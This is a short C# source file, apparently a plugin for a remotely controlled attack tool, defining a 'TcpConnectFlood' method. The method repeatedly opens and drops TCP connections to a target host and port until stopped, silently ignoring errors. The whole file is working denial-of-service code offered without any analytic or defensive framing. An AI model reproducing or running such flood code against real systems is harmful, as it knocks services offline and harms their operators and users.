using System.Net.Sockets;
using Plugin.Helper;

namespace Plugin.Methods;

internal class TcpConnectFlood : Method
{
	public string Name { get; } = "TcpConnectFlood";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket.Connect(host, port);
				socket.Dispose();
			}
			catch
			{
			}
		}
	}
}
